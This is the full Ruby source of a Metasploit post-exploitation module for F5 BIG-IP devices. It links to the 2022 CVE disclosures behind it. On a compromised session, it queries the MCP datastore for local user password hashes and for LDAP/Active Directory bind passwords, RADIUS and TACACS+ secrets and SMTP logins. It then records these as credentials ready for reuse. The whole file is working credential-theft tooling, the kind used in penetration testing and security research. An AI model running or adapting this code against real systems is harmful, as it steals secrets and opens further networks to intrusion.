##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5Mcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Gather Information from MCP Datastore',
        'Description' => %q{
          This module gathers various interesting pieces of data from F5's
          "mcp" datastore, which is accessed via /var/run/mcp using a
          proprietary protocol.

          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
          ['URL', 'https://support.f5.com/csp/article/K97843387'],
        ],
        'DisclosureDate' => '2022-11-16',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from MCP', true]),
        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from MCP', true]),
        OptBool.new('GATHER_DB_VARIABLES', [true, 'Gather database variables (warning: slow)', false]),
      ]
    )
  end

  def gather_hashes
    print_status('Gathering users and password hashes from MCP')
    users = mcp_simple_query('userdb_entry')

    unless users
      print_error('Failed to query users')
      return
    end

    users.each do |u|
      print_good("#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}")

      create_credential(
        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
        origin_type: :session,
        post_reference_name: refname,
        private_type: :nonreplayable_hash,
        private_data: u['userdb_entry_passwd'],
        session_id: session_db_id,
        username: u['userdb_entry_name'],
        workspace_id: myworkspace_id
      )
    end
  end

  def gather_upstream_passwords
    print_status('Gathering upstream passwords from MCP')

    vprint_status('Trying to fetch LDAP / Active Directory configuration')
    ldap_config = mcp_simple_query('auth_ldap_config') || []
    ldap_config.select! { |config| config['auth_ldap_config_bind_pw'] }
    if ldap_config.empty?
      print_status('No LDAP / Active Directory password found')
    else
      ldap_config.each do |config|
        config['auth_ldap_config_servers'].each do |server|
          report_cred(
            username: config['auth_ldap_config_bind_dn'],
            password: config['auth_ldap_config_bind_pw'],
            host: server,
            port: config['auth_ldap_config_port'],
            service_name: (config['auth_ldap_config_ssl'] == 1 ? 'ldaps' : 'ldap')
          )
        end
      end
    end

    vprint_status('Trying to fetch Radius configuration')
    radius_config = mcp_simple_query('radius_server') || []
    radius_config.select! { |config| config['radius_server_secret'] }
    if radius_config.empty?
      print_status('No Radius password found')
    else
      radius_config.each do |config|
        report_cred(
          password: config['radius_server_secret'],
          host: config['radius_server_server'],
          port: config['radius_server_port'],
          service_name: 'radius'
        )
      end
    end

    vprint_status('Trying to fetch TACACS+ configuration')
    tacacs_config = mcp_simple_query('auth_tacacs_config') || []
    tacacs_config.select! { |config| config['auth_tacacs_config_secret'] }
    if tacacs_config.empty?
      print_status('No TACACS+ password found')
    else
      tacacs_config.each do |config|
        config['auth_tacacs_config_servers'].each do |server|
          report_cred(
            password: config['auth_tacacs_config_secret'],
            host: server,
            port: 49,
            service_name: 'tacacs+'
          )
        end
      end
    end

    vprint_status('Trying to fetch SMTP configuration')
    smtp_config = mcp_simple_query('smtp_config') || []
    smtp_config.select! { |config| config['smtp_config_username'] }
    if smtp_config.empty?
      print_status('No SMTP password found')
    else
      smtp_config.each do |config|
        report_cred(
          username: config['smtp_config_username'],
          password: config['smtp_config_password'],
          host: config['smtp_config_smtp_server_address'],
          port: config['smtp_config_smtp_server_port'],
          service_name: 'smtp'
        )
      end
    end
  end

  def gather_db_variables
    print_status('Fetching db variables from MCP (this takes a bit)...')
    vars = mcp_simple_query('db_variable')

    unless vars
      print_error('Failed to query db variables')
      return
    end

    vars.each do |v|
      print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
    end
  end

  def resolve_host(hostname)
    ip = nil
    if session.type == 'meterpreter' && session.commands.include?(Rex::Post::Meterpreter::Extensions::Stdapi::COMMAND_ID_STDAPI_NET_RESOLVE_HOST)
      result = session.net.resolve.resolve_host(hostname)
      ip = result[:ip] if result
    else
      result = cmd_exec("dig +short '#{hostname}'")
      ip = result.strip unless result.blank?
    end

    vprint_warning("Failed to resolve hostname: #{hostname}") unless ip

    ip
  rescue Rex::Post::Meterpreter::RequestError => e
    elog("Failed to resolve hostname: #{hostname.inspect}", error: e)
  end

  def report_cred(opts)
    netloc = "#{opts[:host]}:#{opts[:port]}"
    print_good("#{netloc.ljust(21)} - #{opts[:service_name]}: '#{opts[:username]}:#{opts[:password]}'")

    if opts[:host] && !Rex::Socket.is_ip_addr?(opts[:host])
      opts[:host] = resolve_host(opts[:host])
    end

    service_data = {
      address: opts[:host],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: opts.fetch(:protocol, 'tcp'),
      workspace_id: myworkspace_id
    }

    credential_data = {
      post_reference_name: refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:username]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    gather_hashes if datastore['GATHER_HASHES']
    gather_upstream_passwords if datastore['GATHER_SERVICE_PASSWORDS']
    gather_db_variables if datastore['GATHER_DB_VARIABLES']
  end
end
